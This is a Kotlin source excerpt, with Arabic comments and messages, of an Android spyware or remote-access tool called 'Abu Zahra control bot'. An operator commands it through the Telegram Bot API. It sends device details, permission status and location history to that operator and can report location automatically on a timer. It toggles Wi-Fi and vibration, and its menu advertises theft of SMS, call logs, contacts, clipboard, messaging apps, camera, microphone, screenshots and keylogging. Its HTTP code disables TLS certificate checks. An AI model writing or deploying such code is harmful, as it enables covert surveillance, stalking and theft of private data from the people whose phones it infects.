    private suspend fun sendKernelInfo(context: Context) {
        val sb = StringBuilder()
        sb.append("⚙️ <b>معلومات النواة</b>\n\n")
        try {
            sb.append("⚙️ النواة: ${System.getProperty("os.version")}\n")
            sb.append("🏗️ البناء: ${Build.DISPLAY}\n")
            try {
                val version = File("/proc/version").readText().trim()
                sb.append("📋 النسخة الكاملة:\n<code>$version</code>\n")
            } catch (e: Exception) {
                sb.append("⚠️ لا يمكن قراءة /proc/version\n")
            }
        } catch (e: Exception) {
            sb.append("⚠️ خطأ: ${e.message}\n")
        }
        sendMessage(sb.toString(), "HTML")
    }

    // ==================== ==================== ====================
    //          أوامر التحكم
    // ==================== ==================== ====================

    private suspend fun sendVibrateCommand(context: Context) {
        try {
            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as? android.os.Vibrator
            if (vibrator != null && vibrator.hasVibrator()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vibrator.vibrate(android.os.VibrationEffect.createOneShot(500, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vibrator.vibrate(500)
                }
                sendMessage("📳 <b>تم تنفيذ الاهتزاز!</b>\n\nتم اهتزاز الجهاز لمدة 500 مللي ثانية", "HTML")
            } else {
                sendMessage("⚠️ الجهاز لا يدعم الاهتزاز", "HTML")
            }
        } catch (e: Exception) {
            sendMessage("⚠️ خطأ في تنفيذ الاهتزاز: ${e.message}", "HTML")
        }
    }

    private suspend fun sendWifiToggleCommand(context: Context, enable: Boolean) {
        val status = if (enable) "تشغيل" else "إيقاف"
        try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            if (wm != null) {
                wm.isWifiEnabled = enable
                sendMessage("📶 <b>Wi-Fi</b>\n\n✅ تم $status Wi-Fi بنجاح\n" +
                        "📌 الحالة الحالية: ${if (wm.isWifiEnabled) "مفعّل ✅" else "معطّل ❌"}", "HTML")
            } else {
                sendMessage("⚠️ لا يمكن الوصول إلى Wi-Fi Manager", "HTML")
            }
        } catch (e: Exception) {
            sendMessage("⚠️ خطأ في $status Wi-Fi: ${e.message}", "HTML")
        }
    }

    private suspend fun sendPermissionsStatus(context: Context) {
        val sb = StringBuilder()
        sb.append("🔒 <b>حالة الصلاحيات</b>\n\n")
        val permissions = listOf(
            android.Manifest.permission.READ_SMS to "📱 قراءة الرسائل",
            android.Manifest.permission.READ_CALL_LOG to "📞 قراءة سجل المكالمات",
            android.Manifest.permission.READ_CONTACTS to "📇 قراءة جهات الاتصال",
            android.Manifest.permission.ACCESS_FINE_LOCATION to "📍 الموقع الدقيق",
            android.Manifest.permission.ACCESS_COARSE_LOCATION to "📍 الموقع التقريبي",
            android.Manifest.permission.READ_EXTERNAL_STORAGE to "📂 قراءة التخزين",
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE to "📂 كتابة التخزين",
            android.Manifest.permission.CAMERA to "📷 الكاميرا",
            android.Manifest.permission.RECORD_AUDIO to "🎤 التسجيل الصوتي",
            android.Manifest.permission.READ_PHONE_STATE to "📱 حالة الهاتف"
        )

        for ((permission, label) in permissions) {
            val granted = context.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED
            sb.append("${if (granted) "✅" else "❌"} $label\n")
        }
        sendMessage(sb.toString(), "HTML")
    }

    // ==================== ==================== ====================
    //          أوامر التطبيقات والملفات الإضافية
    // ==================== ==================== ====================

    private suspend fun executeCalendarCommand(context: Context) {
        sendProcessingNotice("📅 التقويم")
        delay(500)
        sendMessage("📅 <b>بيانات التقويم</b>\n\n⚠️ تتطلب صلاحية READ_CALENDAR\nالبيانات ستكون متاحة عند منح الصلاحية.", "HTML")
    }

    private suspend fun executeBrowserBookmarksCommand(context: Context) {
        sendProcessingNotice("🔖 إشارات المتصفح")
        delay(500)
        sendMessage("🔖 <b>إشارات المتصفح</b>\n\n⚠️ هذه الميزة محدودة على أندرويد الحديث\nبيانات الإشارات غير متوفرة مباشرة.", "HTML")
    }

    private suspend fun executeBrowserHistoryCommand(context: Context) {
        sendProcessingNotice("🌐 سجل المتصفح")
        delay(500)
        sendMessage("🌐 <b>سجل المتصفح</b>\n\n⚠️ هذه الميزة محدودة على أندرويد الحديث\nبيانات سجل التصفح غير متوفرة مباشرة.\n💡 يمكن تتبعها عبر الإشعارات.", "HTML")
    }

    private suspend fun sendLocationHistory(context: Context) {
        sendProcessingNotice("📍 سجل المواقع")
        delay(500)

        val locationFiles = LocalStorageManager.readData(context, "location")
        if (locationFiles.isEmpty()) {
            sendMessage("📍 <b>سجل المواقع</b>\n\nلا يوجد سجل مواقع محفوظ.\n💡 استخدم /location لجمع الموقع الحالي.", "HTML")
            return
        }

        val sb = StringBuilder()
        sb.append("📍 <b>سجل المواقع</b> (${locationFiles.size} تسجيل)\n\n")
        val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type

        locationFiles.take(20).forEachIndexed { index, json ->
            try {
                val loc = gson.fromJson<Map<String, Any>>(json, type)
                val lat = loc["latitude"] ?: "?"
                val lng = loc["longitude"] ?: "?"
                val date = loc["date_readable"] ?: "غير معروف"
                sb.append("━━━ #${index + 1} ━━━\n")
                sb.append("📍 $lat, $lng\n")
                sb.append("📅 $date\n\n")
            } catch (e: Exception) {
                // تجاهل الأخطاء
            }
        }

        if (locationFiles.size > 20) {
            sb.append("... و ${locationFiles.size - 20} تسجيل آخر")
        }

        sendLongMessage(sb.toString(), "HTML")
    }

    // ==================== ==================== ====================
    //          الموقع التلقائي
    // ==================== ==================== ====================

    private suspend fun startAutoLocation(context: Context) {
        if (isAutoLocationRunning) {
            sendMessage("📍 الموقع التلقائي يعمل بالفعل!", "HTML")
            return
        }
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val intervalSecs = prefs.getInt(KEY_AUTO_LOCATION_INTERVAL, 300)
        isAutoLocationRunning = true

        autoLocationJob = scope.launch {
            sendMessage("📍 <b>تم تفعيل الموقع التلقائي</b>\n\n⏱️ الفاصل: $intervalSecs ثانية", "HTML")
            while (isActive && isAutoLocationRunning) {
                try {
                    executeLocationCommand(context)
                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في الموقع التلقائي: ${e.message}")
                }
                delay(intervalSecs * 1000L)
            }
        }
    }

    private suspend fun stopAutoLocation(context: Context) {
        isAutoLocationRunning = false
        autoLocationJob?.cancel()
        sendMessage("📍 <b>تم إيقاف الموقع التلقائي</b>", "HTML")
    }

    // ==================== ==================== ====================
    //          حالة الجهاز والتخزين
    // ==================== ==================== ====================

    /**
     * إرسال حالة الجهاز الحالية
     */
    private suspend fun sendDeviceStatus(context: Context) {
        val status = buildString {
            append("📊 <b>حالة الجهاز</b>\n\n")
            append("📱 الجهاز: ${Build.MODEL}\n")
            append("🏢 الشركة: ${Build.BRAND}\n")
            append("🤖 أندرويد: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n")

            val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
            val battery = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
            append("🔋 البطارية: $battery%\n")

            val startTime = getStartTime(context)
            val uptimeMs = System.currentTimeMillis() - startTime
            val uptimeMins = uptimeMs / 60000
            append("⏱️ وقت التشغيل: $uptimeMins دقيقة\n")

            val lastHeartbeat = SharedPrefsManager.getLastHeartbeat(context)
            if (lastHeartbeat > 0) {
                val minutesAgo = (System.currentTimeMillis() - lastHeartbeat) / 60000
                append("💓 آخر نبض: منذ $minutesAgo دقيقة\n")
            }

            append("📡 الاستطلاع: ${if (isPolling) "✅ نشط" else "❌ متوقف"}\n")
            append("🔄 الموقع التلقائي: ${if (isAutoLocationRunning) "✅ نشط" else "❌ متوقف"}\n")
            append("⌨️ لوحة المفاتيح: ${if (isKeyloggerRunning) "✅ نشطة" else "❌ متوقفة"}\n")

            val fileCount = LocalStorageManager.getFileCount(context)
            val storageSize = LocalStorageManager.getStorageUsageFormatted(context)
            append("💾 الملفات المحفوظة: $fileCount ($storageSize)\n")
            append("🏷️ آخر update: $lastUpdateId\n")
        }

        sendMessage(status, "HTML")
    }

    /**
     * إرسال حالة التخزين المحلي
     */
    private suspend fun sendStorageStatus(context: Context) {
        val summary = LocalStorageManager.getStorageSummary(context)
        val commandCounts = summary["command_counts"] as? Map<*, *> ?: emptyMap<String, Int>()

        val status = buildString {
            append("💾 <b>حالة التخزين المحلي</b>\n\n")
            append("📁 إجمالي الملفات: ${summary["total_files"]}\n")
            append("📊 الحجم: ${summary["total_size_formatted"]}\n\n")
            append("<b>تفاصيل:</b>\n")

            commandCounts.forEach { (key, value) ->
                append("• $key: $value ملف\n")
            }

            if (commandCounts.isEmpty()) {
                append("لا توجد بيانات محفوظة\n")
            }
        }

        sendMessage(status, "HTML")
    }

    // ==================== ==================== ====================
    //          لوحة الأوامر الرئيسية (Main Keyboard)
    // ==================== ==================== ====================

    private suspend fun sendMainKeyboard() {
        val text = """🛡️ <b>بوت أبو زهرة للتحكم - الإصدار 2.0</b>

✅ الجهاز متصل ومتصل مباشرة بتيليجرام

📌 <b>الأوامر المتاحة:</b>

📱 <b>جمع البيانات:</b>
/sms - الرسائل النصية (ملف)
/calls - سجل المكالمات (ملف)
/contacts - جهات الاتصال (ملف)
/location - الموقع الجغرافي
/notifications - الإشعارات
/info - معلومات الجهاز
/battery - حالة البطارية
/apps - التطبيقات المثبتة (ملف)
/gallery - صور المعرض
/files - الملفات
/clipboard - الحافظة

💬 <b>وسائل التواصل:</b>
/whatsapp - /telegram - /instagram
/messenger - /snapchat - /tiktok
/twitter - /viber - /line - /signal

🔧 <b>معلومات الجهاز:</b>
/info - /battery - /storage
/sim - /network - /wifi
/bluetooth - /screen - /ram
/cpu - /ip - /imei - /model

⚙️ <b>التحكم:</b>
/vibrate - /enable_wifi - /disable_wifi
/ping - /reboot - /shutdown

📊 <b>أخرى:</b>
/status - /all - /permissions
/help - /menu - /version - /uptime"""

        sendInlineKeyboard(text, listOf(
            listOf(
                mapOf("text" to "📱 SMS", "callback_data" to "sms"),
                mapOf("text" to "📞 Calls", "callback_data" to "calls"),
                mapOf("text" to "📇 Contacts", "callback_data" to "contacts")
            ),
            listOf(
                mapOf("text" to "📍 Location", "callback_data" to "location"),
                mapOf("text" to "🔔 Notifications", "callback_data" to "notifications"),
                mapOf("text" to "ℹ️ Info", "callback_data" to "info")
            ),
            listOf(
                mapOf("text" to "🔋 Battery", "callback_data" to "battery"),
                mapOf("text" to "📦 Apps", "callback_data" to "apps"),
                mapOf("text" to "📋 Clipboard", "callback_data" to "clipboard")
            ),
            listOf(
                mapOf("text" to "💬 WhatsApp", "callback_data" to "whatsapp"),
                mapOf("text" to "✈️ Telegram", "callback_data" to "telegram"),
                mapOf("text" to "📸 Instagram", "callback_data" to "instagram")
            ),
            listOf(
                mapOf("text" to "📶 WiFi", "callback_data" to "wifi"),
                mapOf("text" to "🔵 Bluetooth", "callback_data" to "bluetooth"),
                mapOf("text" to "📡 Network", "callback_data" to "network")
            ),
            listOf(
                mapOf("text" to "🧮 RAM", "callback_data" to "ram"),
                mapOf("text" to "⚙️ CPU", "callback_data" to "cpu"),
                mapOf("text" to "📱 Screen", "callback_data" to "screen")
            ),
            listOf(
                mapOf("text" to "📸 Snapchat", "callback_data" to "snapchat"),
                mapOf("text" to "🎵 TikTok", "callback_data" to "tiktok"),
                mapOf("text" to "🐦 Twitter", "callback_data" to "twitter")
            ),
            listOf(
                mapOf("text" to "💥 جمع الكل", "callback_data" to "all"),
                mapOf("text" to "📊 Status", "callback_data" to "status"),
                mapOf("text" to "🔒 Permissions", "callback_data" to "permissions")
            ),
            listOf(
                mapOf("text" to "📳 Vibrate", "callback_data" to "vibrate"),
                mapOf("text" to "🏓 Ping", "callback_data" to "ping"),
                mapOf("text" to "⏱️ Uptime", "callback_data" to "uptime")
            ),
            listOf(
                mapOf("text" to "💾 Storage", "callback_data" to "storage"),
                mapOf("text" to "📡 SIM", "callback_data" to "sim"),
                mapOf("text" to "🌐 IP", "callback_data" to "ip")
            ),
            listOf(
                mapOf("text" to "📸 Screenshot", "callback_data" to "screenshot"),
                mapOf("text" to "📷 Camera", "callback_data" to "front_camera"),
                mapOf("text" to "🎤 Audio", "callback_data" to "record_audio")
            ),
            listOf(
                mapOf("text" to "📍 Auto Location", "callback_data" to "auto_location_start"),
                mapOf("text" to "📌 Stop Location", "callback_data" to "auto_location_stop"),
                mapOf("text" to "📋 القائمة", "callback_data" to "menu")
            )
        ))
    }

    // ==================== ==================== ====================
    //          دوال تنسيق البيانات (Data Formatting)
    // ==================== ==================== ====================

    private fun formatMapData(title: String, data: Map<*, *>): String {
        return buildString {
            append("$title\n\n")
            data.forEach { (key, value) ->
                val keyStr = key.toString()
                val valueStr = when (value) {
                    null -> "غير متوفر"
                    is Map<*, *> -> {
                        val inner = StringBuilder()
                        value.forEach { (ik, iv) ->
                            inner.append("  • $ik: $iv\n")
                        }
                        inner.toString()
                    }
                    is List<*> -> "[${value.size} عنصر]"
                    else -> value.toString()
                }
                append("• <b>$keyStr</b>: $valueStr\n")
            }
        }
    }

    private fun formatListData(title: String, data: List<*>): String {
        if (data.isEmpty()) return "$title\n\nلا توجد بيانات"

        return buildString {
            append("$title (${data.size} عنصر)\n\n")
            val maxItems = 30
            val items = data.take(maxItems)
            items.forEachIndexed { index, item ->
                append("━━━ <b>#${index + 1}</b> ━━━\n")
                if (item is Map<*, *>) {
                    item.forEach { (key, value) ->
                        if (value != null) {
                            append("• $key: $value\n")
                        }
                    }
                } else {
                    append("• $item\n")
                }
                append("\n")
            }
            if (data.size > maxItems) {
                append("... و ${data.size - maxItems} عنصر آخر")
            }
        }
    }

    /**
     * الحصول على معلومات مختصرة عن الجهاز
     */
    private fun getDeviceInfoShort(context: Context): String {
        val deviceId = SharedPrefsManager.getDeviceId(context) ?: "غير معروف"
        return """📱 <b>معلومات الجهاز</b>
• الموديل: <b>${Build.MODEL}</b>
• الشركة: <b>${Build.BRAND}</b>
• أندرويد: <b>${Build.VERSION.RELEASE}</b>
• معرف: <code>$deviceId</code>

🟢 الجهاز متصل مباشرة بتيليجرام
📡 يتم استقبال الأوامر تلقائياً
📎 البيانات تُرسل كملفات مرفقة"""
    }

    // ==================== ==================== ====================
    //          دوال مساعدة
    // ==================== ==================== ====================

    private fun formatDate(timestamp: Long): String {
        return try {
            val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            sdf.format(Date(timestamp))
        } catch (e: Exception) {
            timestamp.toString()
        }
    }

    private fun formatFileSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> String.format("%.1f KB", bytes / 1024.0)
            bytes < 1024 * 1024 * 1024 -> String.format("%.1f MB", bytes / (1024.0 * 1024.0))
            else -> String.format("%.1f GB", bytes / (1024.0 * 1024.0 * 1024.0))
        }
    }

    private fun formatIpAddress(ipAddress: Int): String {
        return ((ipAddress and 0xFF).toString() + "." +
                ((ipAddress shr 8) and 0xFF).toString() + "." +
                ((ipAddress shr 16) and 0xFF).toString() + "." +
                ((ipAddress shr 24) and 0xFF).toString())
    }

    // ==================== ==================== ====================
    //          دوال HTTP المساعدة (HTTP Helpers)
    // ==================== ==================== ====================

    private fun httpPost(method: String, body: String): String? {
        return try {
            val url = URL("$TELEGRAM_API/$method")
            val connection = setupConnection(url) as? HttpURLConnection ?: return null
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            connection.setRequestProperty("Accept", "application/json")
            connection.doOutput = true

            OutputStreamWriter(connection.outputStream, "UTF-8").use { writer ->
                writer.write(body)
                writer.flush()
            }

            val responseCode = connection.responseCode
            val responseBody = readResponse(connection)

            if (responseCode in 200..299) {
                responseBody
            } else {
                Log.e(TAG, "HTTP POST فشل: $responseCode - $responseBody - method: $method")
                null
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في HTTP POST [$method]: ${e.message}", e)
            null
        }
    }

    private fun httpGet(endpoint: String): String? {
        return try {
            val url = URL("$TELEGRAM_API/$endpoint")
            val connection = setupConnection(url) as? HttpURLConnection ?: return null
            connection.requestMethod = "GET"
            connection.setRequestProperty("Accept", "application/json")

            val responseCode = connection.responseCode
            val responseBody = readResponse(connection)

            if (responseCode in 200..299) {
                responseBody
            } else {
                Log.e(TAG, "HTTP GET فشل: $responseCode - endpoint: $endpoint")
                null
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في HTTP GET [$endpoint]: ${e.message}", e)
            null
        }
    }

    /**
     * الرد على Callback Query
     */
    private fun answerCallbackQuery(callbackId: String) {
        scope.launch {
            try {
                val payload = mapOf("callback_query_id" to callbackId)
                httpPost("answerCallbackQuery", gson.toJson(payload))
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في answerCallbackQuery: ${e.message}")
            }
        }
    }

    private fun setupConnection(url: URL): java.net.HttpURLConnection {
        val connection = url.openConnection() as java.net.HttpURLConnection
        connection.connectTimeout = CONNECT_TIMEOUT
        connection.readTimeout = READ_TIMEOUT

        if (connection is HttpsURLConnection) {
            try {
                val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
                    override fun checkClientTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
                    override fun checkServerTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
                    override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
                })

                val sslContext = SSLContext.getInstance("TLS")
                sslContext.init(null, trustAllCerts, java.security.SecureRandom())
                connection.sslSocketFactory = sslContext.socketFactory
                connection.hostnameVerifier = HostnameVerifier { _, _ -> true }
            } catch (e: Exception) {
                Log.w(TAG, "تحذير SSL: ${e.message}")
            }
        }

        return connection
    }

    private fun readResponse(connection: HttpURLConnection): String {
        val stream = try {
            connection.inputStream
        } catch (e: Exception) {
            connection.errorStream
        }

        return stream?.bufferedReader()?.use { reader ->
            reader.readText()
        } ?: ""
    }

    /**
     * إيقاف جميع العمليات
     */
    fun shutdown() {
        isPolling = false
        isAutoLocationRunning = false
        pollingJob?.cancel()
        autoLocationJob?.cancel()
        scope.cancel()
        Log.d(TAG, "تم إيقاف جميع العمليات")
    }
}
